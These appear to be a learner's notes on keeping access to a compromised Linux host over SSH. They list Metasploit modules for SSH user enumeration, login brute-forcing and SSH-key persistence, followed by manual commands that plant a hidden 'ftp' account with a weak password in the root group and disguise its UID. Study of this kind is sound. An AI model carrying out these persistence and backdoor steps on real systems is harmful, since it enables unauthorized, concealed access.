first exploit it
- module ssh_enumusers (get users in target)
- module ssh_login (get password of user then loggin)
-------------------
we now have open session in target we want to have persistence so if we lose connection in target we still want to connect , so we will find ssh id_rsa key 
- module post/linux/manage/sshkey_persistence (it will give us a rsa key and path if not we can enbale createsshfolder and it will make us new one)
	- set username jackie
	- set session 2(depends where is you session shell)
	- run (it will create for us path of key and place where key is save on target system)
	- loot (will show us our key path)
- module auxiliary/scanner/ssh/ssh_login_pubkey (we want to use these credentials keys and use it)
	- set username jackie
	- set key_pass "key"
	- set key_path "/path/to/key_file"
	- run (it should open new sessions with same privileges as jackie)
- we can do it manually 
	- loot and get path of key in our system 
		- cat key_file and copy contents
		- make new file called ssh_key
		- chmod 0400 ssh_key
		- ssh -i ssh_key user@192.169.2.3
		- we are connected


backdoor manually
- cat /etc/passwd
- useradd -m ftp -s /bin/bash
- passwd ftp password123
- cat/etc/passwd
- usermod -aG root ftp
- groups ftp
- change the time this user has been created
	- usermod -u 15 ftp
